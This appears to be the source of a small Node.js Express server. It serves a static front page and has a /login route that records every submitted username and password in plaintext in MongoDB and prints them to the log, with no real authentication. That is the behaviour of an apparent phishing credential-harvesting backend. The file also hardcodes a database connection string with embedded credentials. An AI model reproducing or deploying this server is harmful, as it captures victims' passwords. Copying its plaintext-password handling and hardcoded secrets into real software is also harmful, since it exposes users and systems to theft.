const express = require("express");
const mongoose = require("mongoose");
const app = express();
const path = require("path");

// Use Render's PORT or default to 3000
const PORT = process.env.PORT || 3000;

// MongoDB Connection
const mongoURI = "mongodb+srv://fanscricket90:nadeer@cluster0.h6iqs.mongodb.net/test?retryWrites=true&w=majority";

mongoose.connect(mongoURI)
    .then(() => console.log("✅ Connected to MongoDB"))
    .catch(err => console.error("❌ MongoDB connection error:", err));

app.use(express.static("public")); // Serve static files
app.use(express.json()); // Enable JSON parsing

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Create a Mongoose Schema for Login Attempts
const loginSchema = new mongoose.Schema({
    username: String,
    password: String,
    timestamp: { type: Date, default: Date.now }
});

const LoginAttempt = mongoose.model("LoginAttempt", loginSchema);

// Handle login attempts
app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    try {
        // Save login attempt to MongoDB
        const newLogin = new LoginAttempt({ username, password });
        await newLogin.save();
        console.log("✅ Login attempt saved:", { username, password });

        res.json({ message: "Login attempt recorded in MongoDB!" });
    } catch (error) {
        console.error("❌ Error saving login attempt:", error);
        res.status(500).json({ message: "Error saving login attempt" });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
